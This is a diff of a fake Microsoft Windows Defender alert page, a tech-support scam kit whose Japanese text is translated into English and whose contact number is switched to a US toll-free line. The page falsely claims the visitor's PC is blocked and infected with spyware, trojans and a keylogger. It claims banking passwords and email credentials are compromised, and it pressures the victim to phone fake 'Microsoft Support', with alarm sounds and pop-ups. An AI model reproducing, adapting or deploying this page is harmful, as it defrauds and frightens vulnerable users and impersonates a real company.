@@ -1,24 +1,8 @@
-
-
 <!doctype html>
 
 <html lang="en">
 
 <head>
-<!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-252386984-1"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-F7ZFZW9VDE');
-</script>
-
-
-
-
-
 
     <meta charset="utf-8">
 
@@ -72,9 +56,9 @@
 
        
 
-        var phone_number = '050-5534-9583    (無料通話)';
+        var phone_number = '1-888-203-0321 (USA-Toll-Free)';
 
-        var phone_number2 = '050-5534-9583';
+        var phone_number2 = '1-888-203-0321';
 
 
 
@@ -394,7 +378,7 @@
 
     top: 5px;">Microsoft</span>
 
-    <p style="font-weight: 600;">サポート問い合わせ先</p>
+    <p style="font-weight: 600;">Contact Support</p>
 
     <h4 style="font-weight: 600;">
 
@@ -420,7 +404,7 @@
 
 
 
-<div id="delayedPopup" class="delayedPopupWindow lightbox" style="background:red;">
+<div id="delayedPopup" class="delayedPopupWindow lightbox">
 
     <!-- This is the close button -->
 
@@ -446,7 +430,7 @@
 
     margin-left: 10px;">
 
-                            <img src="microsoft.jpg"><span style="color: #000;">Windows ファイアウォール保護</span>
+                            <img src="microsoft.jpg"><span style="color: #000;">Windows Firewall Protection</span>
 
                         </div>
 
@@ -492,14 +476,11 @@
 
             <div class="formDescription">
 
-                <h2>ポルノ警告 - エラーコード: #0x268d3(x7)
-</h2>
+                <h2>Pornographic Alert - Error Code: #0x268d3(x7)</h2>
 
-                <p>セキュリティ上の理由により、この PC へのアクセスはブロックされています
-</p>
+                <p>Access to this PC has been blocked for security reasons.</p>
 
-                <p>Windows サポートに連絡する
-
+                <p>Contact Windows Support:
 
                     <script>document.write(phone_number2);</script>
 
@@ -521,8 +502,7 @@
 
             <div class="col-md-6 left-code">
 
-                <p>検出された脅威 - ポルノ スパイウェア
-<br>
+                <p>Threat_Detected - Pornographic Spyware<br>
 
                     App: Ads.financetrack(1).exe</p>
 
@@ -532,11 +512,9 @@
 
                 <div class="button_new" id="footer_btn">
 
-                    <a href="#" class="safe">とにかく実行
-</a>
+                    <a href="#" class="safe">Run Anyway</a>
 
-                    <a href="#" class="anyway blink">安全に戻る
-</a>
+                    <a href="#" class="anyway blink">Back to Safety</a>
 
                 </div>
 
@@ -572,49 +550,39 @@
 
     color: #414141;font-weight: bold;
 
-    margin-top: 8px;">Windows_Defender - セキュリティ警告
-</p>
+    margin-top: 8px;">Windows_Defender - Security Warning</p>
 
-                <p class="text-center">** セキュリティ上の理由により、この PC へのアクセスはブロックされています
-**</p>
+                <p class="text-center">** ACCESS TO THIS PC HAS BEEN BLOCKED FOR SECURITY REASONS **</p>
 
-                <p>お使いのコンピュータは、ポルノ スパイウェアに感染していることを警告しています。次のデータが侵害されました
-.</p>
+                <p>Your computer has alerted us that it has been infected with a Pornographic Spyware. The following data has been compromised.</p>
 
-                <p>&gt; メール認証情報
-<br>
+                <p>&gt; Email Credentials<br>
 
-                    &gt; バンキングパスワード
-<br>
+                    &gt; Banking Passwords<br>
 
-                    &gt; フェイスブックログイン
-<br>
+                    &gt; Facebook Login<br>
 
-                    &gt; ピクチャー
-&amp; ドキュメント
-
+                    &gt; Pictures &amp; Documents
 
 
 
                 </p>
 
-                <p>Windows Defender スキャンにより、パスワード、オンライン ID、財務情報、個人ファイル、写真、またはドキュメントを盗む可能性のある望ましくない可能性のあるアドウェアがこのデバイスで検出されました
-.</p>
+                <p>Windows_Defender Scan has found potentially unwanted Adware on this device that can steal your passwords, online identity, financial information, personal files, pictures or documents.</p>
 
-                <p>エンジニアが削除プロセスを順を追って説明できるように、すぐにご連絡ください。
+                <p>You must contact us immediately so that our engineers can walk you through the removal process over
 
-                    電話.</p>
+                    the phone.</p>
 
-                <p>すぐに Microsoft サポートに連絡して、この脅威を報告し、個人情報の盗難を防ぎ、アクセスのロックを解除してください。
+                <p>Call Microsoft Support immediately to report this threat, prevent identity theft and unlock access to
 
-                    この装置.</p>
+                    this device.</p>
 
-                <p>このウィンドウを閉じると、個人情報が危険にさらされ、アクセスが停止されます。
+                <p>Closing this window will put your personal information at risk and lead to a suspension of your
 
-                    Windows 登録.</p>
+                    Windows Registration.</p>
 
-                <p style="padding-bottom: 0px;">Microsoft サポートに電話する
-: <strong>
+                <p style="padding-bottom: 0px;">Call Microsoft Support: <strong>
 
                         <script>document.write(phone_number);</script>
 
@@ -622,7 +590,7 @@
 
                 <div class="action_buttons"><a class="active" id="leave_page" style="cursor: pointer;">OK</a> <a
 
-                            class="active" id="leave_page">キャンセル</a></div>
+                            class="active" id="leave_page">Cancel</a></div>
 
             </div>
 
@@ -686,8 +654,7 @@
 
         <img src="microsoft.png" class="ico"/>
 
-        <div class="name">Microsoft-Windows-Defender アラート
- 050-5534-9583 (無料通話)....</div>
+        <div class="name">Microsoft-Windows-Defender Alert 1-888-203-0321 (USA-Toll-Free)</div>
 
         <img src="5f205bba58587_v.png" class="win_min"/> <img src="5f205bbe46967_v.png" class="win_cls"/>
 
@@ -697,11 +664,11 @@
 
         <img src="5f205bbdae210_v.png" class="ico_gray1" id="w1_ico1"/>
 
-        <div class="set" id="w1_1">設定</div>
+        <div class="set" id="w1_1">Settings</div>
 
         <img src="5f205bbae3ed9_v.png" class="ico_gray2" id="w1_ico2"/>
 
-        <div class="help" id="w1_2">ヘルプ</div>
+        <div class="help" id="w1_2">Help</div>
 
     </div>
 
@@ -709,19 +676,19 @@
 
         <img src="5f205bb9bf55a_v.gif" class="pc"/>
 
-        <div class="txt1" id="w1_3">保護されています</div>
+        <div class="txt1" id="w1_3">You Are Protected</div>
 
         <div class="txt2">
 
-            <span id="w1_4">保護の更新: </span><span style="color: #23a31c;" id="w1_5">現在</span><br/>
+            <span id="w1_4">Protection Updates: </span><span style="color: #23a31c;" id="w1_5">Current</span><br/>
 
-            <span id="w1_6">最後のスキャン: </span><span style="color: #c00;" id="w1_7">利用不可</span> <span
+            <span id="w1_6">Last Scan: </span><span style="color: #c00;" id="w1_7">Not available</span> <span
 
                     style="color: #2ea8e5;" id="w1_8">| Quick Scan</span><br/>
 
-            <span id="w1_9">使用ライセンス: </span><span style="color: #23a31c;" id="w1_10">1 of 5</span> <span
+            <span id="w1_9">Licenses Used: </span><span style="color: #23a31c;" id="w1_10">1 of 5</span> <span
 
-                    style="color: #2ea8e5;" id="w1_11">| 別のデバイスにインストールする</span>
+                    style="color: #2ea8e5;" id="w1_11">| Install on Another Device</span>
 
         </div>
 
@@ -731,11 +698,11 @@
 
     <div class="bl1">
 
-        <div class="txt1" id="w1_12">安全</div>
+        <div class="txt1" id="w1_12">Security</div>
 
         <img src="5f205bbbf25aa_v.gif" class="ico"/>
 
-        <div class="txt2" id="w1_13" style="color: red">無効</div>
+        <div class="txt2" id="w1_13" style="color: red">Disabled</div>
 
         <div class="line"></div>
 
@@ -743,11 +710,11 @@
 
     <div class="bl2">
 
-        <div class="txt1" id="w1_14">身元</div>
+        <div class="txt1" id="w1_14">Identity</div>
 
         <img src="5f205bbc8a6e3_v.gif" class="ico"/>
 
-        <div class="txt2" id="w1_13a" style="color: red">危険にさらされている</div>
+        <div class="txt2" id="w1_13a" style="color: red">At Risk</div>
 
         <div class="line"></div>
 
@@ -755,11 +722,11 @@
 
     <div class="bl3">
 
-        <div class="txt1" id="w1_15">パフォーマンス</div>
+        <div class="txt1" id="w1_15">Performance</div>
 
         <img src="5f205bc00090f_v.gif" class="ico"/>
 
-        <div class="txt2" id="w1_13b">最適化</div>
+        <div class="txt2" id="w1_13b">Optimized</div>
 
         <div class="line"></div>
 
@@ -767,17 +734,17 @@
 
     <div class="bl4">
 
-        <div class="txt1" id="w1_16" style="font-size: 20px;">ファイアウォール</div>
+        <div class="txt1" id="w1_16" style="font-size: 20px;">Firewall</div>
 
         <img src="microsoft.png" class="ico" style="width: 52px;margin-top: 27px;"/>
 
-        <div class="txt2" id="w1_13c">オフ</div>
+        <div class="txt2" id="w1_13c">Turned Off</div>
 
     </div>
 
     <div class="gray_line2">
 
-        <div class="txt"><span id="w1_17">スターテス : </span><span class="gr" id="w1_18" style="color: red;">あなたのパソコンは危険にさらされています！</span>
+        <div class="txt"><span id="w1_17">STATUS : </span><span class="gr" id="w1_18" style="color: red;">Your PC is at Risk!</span>
 
         </div>
 
@@ -789,7 +756,7 @@
 
     <div class="header">
 
-        <div class="name" id="w2_1">クイックスキャン</div>
+        <div class="name" id="w2_1">Quick Scan</div>
 
         <img src="5f205bba58587_v.png" class="win_min"/> <img src="5f205bbe46967_v.png" class="win_cls"/>
 
@@ -799,9 +766,9 @@
 
         <img src="5f205bbece31e_v.gif" class="ring"/>
 
-        <div class="header" id="w2_2">働く</div>
+        <div class="header" id="w2_2">Working</div>
 
-        <div class="txt1" id="w2_3">よく感染する領域と起動ファイルのスキャン...</div>
+        <div class="txt1" id="w2_3">Scanning commonly infected areas and startup files...</div>
 
         <div class="txt2" id="path1">C:WindowsSystem32sihost.exe</div>
 
@@ -815,8 +782,7 @@
 
         <div class="header" id="w2_4">Working</div>
 
-        <div class="txt1" id="w2_5">
-よく感染する領域と起動ファイルのスキャン...</div>
+        <div class="txt1" id="w2_5">Scanning commonly infected areas and startup files...</div>
 
         <div class="txt2" id="path2">C:\Program Files\Windows Defender\MSASCuiL.exe</div>
 
@@ -826,15 +792,15 @@
 
     <div class="tab">
 
-        <div class="line1" id="w2_6">結果概要</div>
+        <div class="line1" id="w2_6">Results Summary</div>
 
-        <div class="line2" id="w2_7">[+] スキャンされたアイテムの総数:</div>
+        <div class="line2" id="w2_7">[+] Total items scanned:</div>
 
-        <div class="line3" id="w2_8">[+] 検出されたセキュリティ リスクの合計:</div>
+        <div class="line3" id="w2_8">[+] Total security risks detected:</div>
 
-        <div class="line4" id="w2_9">[+] セキュリティリスクをトータルで解決:</div>
+        <div class="line4" id="w2_9">[+] Total security risks resolved:</div>
 
-        <div class="line5" id="w2_10">注意が必要な総合的なセキュリティリスク:</div>
+        <div class="line5" id="w2_10">Total security risks requiring attention:</div>
 
         <div class="line6"></div>
 
@@ -850,9 +816,9 @@
 
     <img src="microsoft.png" class="nrt_logo"/><span class="mask2">Microsoft</span>
 
-    <div class="btn1" id="w2_11">一時停止</div>
+    <div class="btn1" id="w2_11">Pause</div>
 
-    <div class="btn2" id="w2_12">ストップ</div>
+    <div class="btn2" id="w2_12">Stop</div>
 
 </div>
 
@@ -866,7 +832,7 @@
 
         <div class="line_red">
 
-            <span id="w4_1"><b>脅威を発見!</b></span><br/>
+            <span id="w4_1"><b>Threat Detected!</b></span><br/>
 
             Win32/Hoax.Renos.HX
 
@@ -874,16 +840,15 @@
 
         <img src="5f205bc1a74d5_v.gif" class="ico_tray1"/>
 
-        <div class="txt1" id="w4_2">
-リスクが高い</div>
+        <div class="txt1" id="w4_2">High Risk</div>
 
         <img src="5f205bc2379ac_v.gif" class="ico_tray2"/>
 
         <div class="txt2">
 
-            <span id="w4_4"><b>元</b></span><br/>
+            <span id="w4_4"><b>Origin</b></span><br/>
 
-            <span id="w4_5">利用不可</span>
+            <span id="w4_5">Not available</span>
 
         </div>
 
@@ -891,9 +856,9 @@
 
         <div class="txt3">
 
-            <span id="w4_6"><b>アクティビティ</b></span><br/>
+            <span id="w4_6"><b>Activity</b></span><br/>
 
-            <span id="w4_7">実行された脅威アクション: 1</span>
+            <span id="w4_7">Threat actions performed: 1</span>
 
         </div>
 
@@ -907,8 +872,7 @@
 
         <div class="line_red">
 
-            <span id="w4_1a"><b>
-脅威を発見!</b></span><br/>
+            <span id="w4_1a"><b>Threat Detected!</b></span><br/>
 
             Trojan IRC/Backdor.Sd.FRV
 
@@ -916,15 +880,15 @@
 
         <img src="5f205bc1a74d5_v.gif" class="ico_tray1"/>
 
-        <div class="txt1" id="w4_2a">リスクが高い</div>
+        <div class="txt1" id="w4_2a">High Risk</div>
 
         <img src="5f205bc2379ac_v.gif" class="ico_tray2"/>
 
         <div class="txt2">
 
-            <span id="w4_4a"><b>元</b></span><br/>
+            <span id="w4_4a"><b>Origin</b></span><br/>
 
-            <span id="w4_5a">利用不可</span>
+            <span id="w4_5a">Not available</span>
 
         </div>
 
@@ -932,10 +896,9 @@
 
         <div class="txt3">
 
-            <span id="w4_6a"><b>アクティビティ</b></span><br/>
+            <span id="w4_6a"><b>Activity</b></span><br/>
 
-            <span id="w4_7a">
-実行された脅威アクション: 1</span>
+            <span id="w4_7a">Threat actions performed: 1</span>
 
         </div>
 
@@ -949,7 +912,7 @@
 
         <div class="line_red">
 
-            <span id="w4_1b"><b>脅威を発見!</b></span><br/>
+            <span id="w4_1b"><b>Threat Detected!</b></span><br/>
 
             Adware.Win32.Look2me.ab
 
@@ -957,15 +920,15 @@
 
         <img src="5f205bc1a74d5_v.gif" class="ico_tray1"/>
 
-        <div class="txt1" id="w4_3">中リスク</div>
+        <div class="txt1" id="w4_3">Medium Risk</div>
 
         <img src="5f205bc2379ac_v.gif" class="ico_tray2"/>
 
         <div class="txt2">
 
-            <span id="w4_4b"><b>元</b></span><br/>
+            <span id="w4_4b"><b>Origin</b></span><br/>
 
-            <span id="w4_5b">利用不可</span>
+            <span id="w4_5b">Not available</span>
 
         </div>
 
@@ -973,9 +936,9 @@
 
         <div class="txt3">
 
-            <span id="w4_6b"><b>アクティビティ</b></span><br/>
+            <span id="w4_6b"><b>Activity</b></span><br/>
 
-            <span id="w4_7b">実行された脅威アクション: 1</span>
+            <span id="w4_7b">Threat actions performed: 1</span>
 
         </div>
 
@@ -989,23 +952,23 @@
 
         <div class="line_red">
 
-            <span id="w4_1c"><b>脅威を発見!</b></span><br/>
+            <span id="w4_1c"><b>Threat Detected!</b></span><br/>
 
-           Trojan.Qoologic - キーロガー
+            Trojan.Qoologic - Key Logger
 
         </div>
 
         <img src="5f205bc1a74d5_v.gif" class="ico_tray1"/>
 
-        <div class="txt1" id="w4_2b">リスクが高い</div>
+        <div class="txt1" id="w4_2b">High Risk</div>
 
         <img src="5f205bc2379ac_v.gif" class="ico_tray2"/>
 
         <div class="txt2">
 
-            <span id="w4_4c"><b>元</b></span><br/>
+            <span id="w4_4c"><b>Origin</b></span><br/>
 
-            <span id="w4_5c">利用不可</span>
+            <span id="w4_5c">Not available</span>
 
         </div>
 
@@ -1013,9 +976,9 @@
 
         <div class="txt3">
 
-            <span id="w4_6c"><b>アクティビティ</b></span><br/>
+            <span id="w4_6c"><b>Activity</b></span><br/>
 
-            <span id="w4_7c">実行された脅威アクション: 1</span>
+            <span id="w4_7c">Threat actions performed: 1</span>
 
         </div>
 
@@ -1029,7 +992,7 @@
 
         <div class="line_red">
 
-            <span id="w4_1d"><b>脅威を発見!</b></span><br/>
+            <span id="w4_1d"><b>Threat Detected!</b></span><br/>
 
             Trojan.Fakealert.356
 
@@ -1037,15 +1000,15 @@
 
         <img src="5f205bc1a74d5_v.gif" class="ico_tray1"/>
 
-        <div class="txt1" id="w4_2c">リスクが高い</div>
+        <div class="txt1" id="w4_2c">High Risk</div>
 
         <img src="5f205bc2379ac_v.gif" class="ico_tray2"/>
 
         <div class="txt2">
 
-            <span id="w4_4d"><b>元</b></span><br/>
+            <span id="w4_4d"><b>Origin</b></span><br/>
 
-            <span id="w4_5d">利用不可</span>
+            <span id="w4_5d">Not available</span>
 
         </div>
 
@@ -1053,9 +1016,9 @@
 
         <div class="txt3">
 
-            <span id="w4_6d"><b>アクティビティ</b></span><br/>
+            <span id="w4_6d"><b>Activity</b></span><br/>
 
-            <span id="w4_7d">実行された脅威アクション: 1</span>
+            <span id="w4_7d">Threat actions performed: 1</span>
 
         </div>
 
@@ -2373,7 +2336,7 @@ $(".chrome-alert").show();
 
     setTimeout(function () {
 
-        document.getElementById("map").style. <div id="delayedPopup" class="delayedPopupWindow lightbox" style="background:red;"> = "block";
+        document.getElementById("map").style.display = "block";
 
         document.getElementById("warning").play();
 
